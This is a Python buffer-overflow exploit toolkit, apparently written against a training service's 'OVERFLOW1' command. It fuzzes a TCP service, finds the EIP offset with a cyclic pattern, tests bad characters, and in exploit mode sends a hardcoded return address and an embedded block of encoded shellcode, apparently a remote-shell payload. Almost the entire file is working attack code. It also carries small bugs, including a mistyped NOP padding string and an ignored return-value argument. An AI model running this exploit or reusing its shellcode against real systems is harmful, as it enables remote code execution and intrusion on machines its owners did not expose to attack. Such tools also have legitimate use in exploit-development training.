import argparse
import binascii
import socket
import sys
import time
from string import ascii_uppercase, ascii_lowercase, digits

MAX_PATTERN_LENGTH = 20280

class MaxLengthException(Exception):
    pass

def fuzz(domain, port):
    print(f"[+] Starting fuzzing domain {domain} on port {port}")
    payload = "OVERFLOW1 " + "A" * 100
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
                s.settimeout(5)
                s.connect((domain, int(port)))
                s.recv(1024)
                print(f"[+] Fuzzing with {len(payload)} bytes.")
                s.send(bytes(payload, "latin-1"))
                s.recv(1024)
        except Exception as e:
            print(e)
            print(f"[!] Fuzzing crashed at {len(payload)} bytes")
            sys.exit(0)
        payload += "A" * 100
        time.sleep(1)

def offset(domain, port, length):
    print("[+] Generating acyclic pattern...")

    if(length > MAX_PATTERN_LENGTH):
        raise MaxLengthException("[!] Error: Pattern length exceeds maximum of {0}".format(MAX_PATTERN_LENGTH))

    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if(len(pattern) < length):
                    pattern += upper + lower + digit
                else:
                    print(pattern[:length])
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.settimeout(5)
                        s.connect((domain, int(port)))
                        s.send(bytes("OVERFLOW1 " + pattern[:length] + "\r\n", "latin-1"))
                        print("[+] Sent Successfully")
                    except Exception as e:
                        print(e)
                        sys.exit(0)
                    return


def query_offset(EIP):
    print("[+] Querying offset...")
    EIP = bytearray.fromhex(EIP)
    EIP = EIP.decode()[::-1]
    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                pattern += upper + lower + digit
                found_at = pattern.find(EIP)
                if found_at > -1:
                    print(f"[!] Exact match at offset {found_at}")
                    return
    print("f[!] EIP not found...")

def bad_characters(domain, port, offset):
    print("[+] Sending bytearray...")
    byte_arr = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = "OVERFLOW1 " + ("A" * int(offset)) + "BBBB" + byte_arr 
    try:
        s.settimeout(5)
        s.connect((domain, int(port)))
        s.send(bytes(buffer, "latin-1"))
        print("[+] Sent Successfully")
    except Exception as e:
        print(e)
        sys.exit(0)
       

def payload(domain, port, offset, retn):
    print("[+] Sending payload...")
    payload = ("\xda\xc9\xd9\x74\x24\xf4\x5e\xba\x1b\x4a\xbe\x42\x31\xc9\xb1"
"\x52\x83\xee\xfc\x31\x56\x13\x03\x4d\x59\x5c\xb7\x8d\xb5\x22"
"\x38\x6d\x46\x43\xb0\x88\x77\x43\xa6\xd9\x28\x73\xac\x8f\xc4"
"\xf8\xe0\x3b\x5e\x8c\x2c\x4c\xd7\x3b\x0b\x63\xe8\x10\x6f\xe2"
"\x6a\x6b\xbc\xc4\x53\xa4\xb1\x05\x93\xd9\x38\x57\x4c\x95\xef"
"\x47\xf9\xe3\x33\xec\xb1\xe2\x33\x11\x01\x04\x15\x84\x19\x5f"
"\xb5\x27\xcd\xeb\xfc\x3f\x12\xd1\xb7\xb4\xe0\xad\x49\x1c\x39"
"\x4d\xe5\x61\xf5\xbc\xf7\xa6\x32\x5f\x82\xde\x40\xe2\x95\x25"
"\x3a\x38\x13\xbd\x9c\xcb\x83\x19\x1c\x1f\x55\xea\x12\xd4\x11"
"\xb4\x36\xeb\xf6\xcf\x43\x60\xf9\x1f\xc2\x32\xde\xbb\x8e\xe1"
"\x7f\x9a\x6a\x47\x7f\xfc\xd4\x38\x25\x77\xf8\x2d\x54\xda\x95"
"\x82\x55\xe4\x65\x8d\xee\x97\x57\x12\x45\x3f\xd4\xdb\x43\xb8"
"\x1b\xf6\x34\x56\xe2\xf9\x44\x7f\x21\xad\x14\x17\x80\xce\xfe"
"\xe7\x2d\x1b\x50\xb7\x81\xf4\x11\x67\x62\xa5\xf9\x6d\x6d\x9a"
"\x1a\x8e\xa7\xb3\xb1\x75\x20\xb6\x43\x64\x09\xae\x49\x86\x78"
"\x73\xc7\x60\x10\x9b\x81\x3b\x8d\x02\x88\xb7\x2c\xca\x06\xb2"
"\x6f\x40\xa5\x43\x21\xa1\xc0\x57\xd6\x41\x9f\x05\x71\x5d\x35"
"\x21\x1d\xcc\xd2\xb1\x68\xed\x4c\xe6\x3d\xc3\x84\x62\xd0\x7a"
"\x3f\x90\x29\x1a\x78\x10\xf6\xdf\x87\x99\x7b\x5b\xac\x89\x45"
"\x64\xe8\xfd\x19\x33\xa6\xab\xdf\xed\x08\x05\xb6\x42\xc3\xc1"
"\x4f\xa9\xd4\x97\x4f\xe4\xa2\x77\xe1\x51\xf3\x88\xce\x35\xf3"
"\xf1\x32\xa6\xfc\x28\xf7\xc6\x1e\xf8\x02\x6f\x87\x69\xaf\xf2"
"\x38\x44\xec\x0a\xbb\x6c\x8d\xe8\xa3\x05\x88\xb5\x63\xf6\xe0"
"\xa6\x01\xf8\x57\xc6\x03")
    padding = "x\90" * 16
    retn = bytes.fromhex("af115062").decode("latin-1")
    buffer = "OVERFLOW1 " + ("A" * int(offset)) + retn + padding + payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(5)
        s.connect((domain, int(port)))
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("[+] Sent Successfully")
    except Exception as e:
        print(e)
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='Buffer Overflow Toolkit.', 
            usage="buff.py [mode] [options]",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog='''
FUZZING EXAMPLE: buff.py --fuzz -d 192.168.2.1 -p 8080
OFFSET EXAMPLE: buff.py --offset -d 192.168.2.1 -p 8080 -l 1986
QUERY EXAMPLE: buff.py --query -q 6F43396E
BAD CHARACTERS EXAMPLE: buff.py --chars -d 192.168.2.1 -p 8080 -o 1986
EXPLOIT EXAMPLE: buff.py --exploit -d 192.168.2.1 -p 8080 -o 1986 -r 'af115062'
                    ''')
    parser.add_argument('--fuzz', help='fuzzing mode', action='store_true')
    parser.add_argument('--offset', help='find offset mode', action='store_true')
    parser.add_argument('--query', help='query offset mode', action='store_true')
    parser.add_argument('--chars', help='bad characters mode', action='store_true')
    parser.add_argument('--exploit', help='exploit mode', action='store_true')
    parser.add_argument('-d', metavar='', help='specify the domain of the buffer overflow.')
    parser.add_argument('-p', metavar='', help='specify the port of the buffer overflow.')
    parser.add_argument('-l', metavar='', help='specify the max length of the offset.')
    parser.add_argument('-q', metavar='', help='specify the EIP to query offset of.')
    parser.add_argument('-o', metavar='', help='specify the offset.')
    parser.add_argument('-r', metavar='', help='specify the return value in the EIP register.')

    
    args = parser.parse_args()
    if(args.fuzz):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to fuzz.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to fuzz.")
        if(args.d is not None and args.p is not None):
            fuzz(args.d, args.p)
    elif(args.offset):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to find the offset of.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to find the offset of.")
        if(args.l == None):
            print("[!] Please specify a max length of offset (-l).")
        if(args.d is not None and args.p is not None and args.l is not None):
            offset(args.d, args.p, int(args.l))
    elif(args.query):
        if(args.q == None):
            print("[!] Please specify an EIP to query (-q).")
        if(args.q):
            query_offset(args.q)
    elif(args.chars):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to send bad characters to.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to send bad characters to.")
        if(args.o == None):
            print("[!] Please specify an offset (-o) to send bad character to.")
        if(args.d is not None and args.p is not None and args.o is not None):
            bad_characters(args.d, args.p, args.o)
    elif(args.exploit):
        if(args.d == None):
            print("[!] Please specify a domain (-d) to send the payload to.")
        if(args.p == None):
            print("[!] Please specify a port (-p) to send the payload to.")
        if(args.o == None):
            print("[!] Please specify an offset (-o)")
        if(args.r == None):
            print("[!] Please specify a return value (-r)")
        if(args.d is not None and args.p is not None and args.o is not None and args.r is not None):
            payload(args.d, args.p, args.o, args.r)
main()
